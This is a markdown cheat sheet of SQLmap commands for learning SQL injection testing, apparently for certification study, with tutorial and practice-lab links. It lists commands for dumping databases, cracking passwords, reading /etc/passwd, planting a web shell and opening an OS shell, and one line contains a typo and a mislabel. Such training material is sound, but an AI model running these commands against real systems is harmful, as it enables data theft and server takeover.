### Learn about SQLmap
- [SQLmap tutorial for begineers](https://tryhackme.com/room/sqlmap)
- [SQLmap video tutorial](https://www.youtube.com/watch?v=pF7uz_ptuFc&ab_channel=ElPing%C3%BCinodeMario)
- [SQLmap extended video tutorial](https://www.youtube.com/watch?v=2y70Yj0oSxw&ab_channel=SEGURIDADCERO)
### Labs for practice
- [HTB Goodgames](https://app.hackthebox.com/machines/446)
- [HTB Validation](https://app.hackthebox.com/machines/382)

### Cheat Sheet

| **Command**                                                  | **Description**                                             |
| ------------------------------------------------------------ | ----------------------------------------------------------- |
| `sqlmap -h`                                                  | View the basic help menu                                    |
| `sqlmap -hh`                                                 | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`   | Run `SQLMap` without asking for user input                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`  | `SQLMap` with POST request                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                          | Passing an HTTP request file to `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`        | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`             | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`          | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`  | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                      | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`        | Spawning an OS shell                                        |

### Usefull Commands for eWPTX!
```bash
#Seleccionar un target
sqlmap -u "http://www.target.com/path/file.htm?variable=1"

#Cargar una petición desde un archivo
sqlmap -r request

#Utilizar User-Agent random
sqlmap -u "http://www.target.com/path/file.htm?variable=1" --random-agent

#Establecer el nivel de riesgo
sqlmap -u "http://www.target.com/path/file.htm?variable=1" --risk [0-3]

#Establecer el nivel de intensidad del ataque
sqlmap -u "http://www.target.com/path/file.htm?variable=1" --level [0-5]

#Controlar la petición con un proxy por ej BurpSuite
sqlmap --proxy "http://127.0.0.1:8080"

#Establecer una cookie
sqlmap --cookie "example=COOKIE"

#Atacar un parametro especifico
sqlmap -p "parametro" 

#Establecer un token CSRF
sqlmap --csrf-token "token"
sqlmap --csrf-url "url"

#Especificar el gestor de base de datos
sqlmap --dbms=gestor

#Especificar una tabla 
sqpmal -D "table"

#Dumpear toda la DB
sqlmap --dump
```

### SQLMap Payloads in order to use on a real scenario

1. Basic Enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```
2. Table Enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D [DATABASE_NAME]
```
After identifying the name of the table of interest, you can retrieve its content using the --dump option and specifying the name of the table with -T users, like this:
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T [TABLE_NAME] -D [DATABASE_NAME]
```
